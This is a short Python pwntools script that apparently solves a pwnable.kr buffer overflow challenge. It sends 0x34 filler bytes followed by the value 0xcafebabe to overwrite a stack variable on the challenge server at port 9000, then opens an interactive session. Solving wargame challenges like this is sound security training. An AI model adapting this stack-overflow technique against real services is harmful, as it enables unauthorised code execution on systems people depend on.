#! /usr/bin/python

from pwn import *
import sys, os
import struct

HOST = "pwnable.kr"
PORT = 9000

sock = remote(HOST, PORT)

payload = 'A'*0x34 + p32(0xcafebabe)

sock.send(payload)
sock.interactive()

sock.close()
